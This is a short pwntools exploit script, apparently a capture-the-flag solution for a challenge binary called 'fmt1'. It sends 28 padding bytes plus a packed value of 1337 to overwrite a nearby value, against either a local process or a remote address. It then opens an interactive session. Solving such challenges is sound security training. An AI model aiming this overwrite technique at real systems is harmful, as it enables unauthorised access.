from pwn import *

if len(sys.argv) > 1:
	sh=remote("128.199.104.41",27845)
else:
	sh=process("./fmt1")

p='a'*28
p+=p32(1337)

sh.sendline(p)

sh.interactive()